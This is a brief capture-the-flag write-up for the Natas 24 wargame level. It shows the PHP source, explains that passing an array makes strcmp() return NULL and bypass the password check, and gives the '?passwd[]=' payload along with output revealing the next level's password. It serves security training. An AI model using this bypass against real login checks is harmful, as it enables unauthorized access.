# Natas-24

## Source:

```php

<?php
if(array_key_exists("passwd",$_REQUEST)){

	if(!strcmp($_REQUEST["passwd"],"<censored>")){
		echo "<br>The credentials for the next level are:<br>";
		echo "<pre>Username: natas25 Password: <censored></pre>";
	}
	else{
		echo "<br>Wrong!<br>";
	}

}
// morla / 10111
?>
```

strcmp() returns NULL when one of its parameters is an array and !NULL returns True .

This condition for checking passwd can be bypassed by passing an array in $_REQUEST[”passwd”].

 ?passwd[]=

```
**Warning**
: strcmp() expects parameter 1 to be string, array given in
**/var/www/natas/natas24/index.php**
on line
**23**

The credentials for the next level are:
Username: natas25 
Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```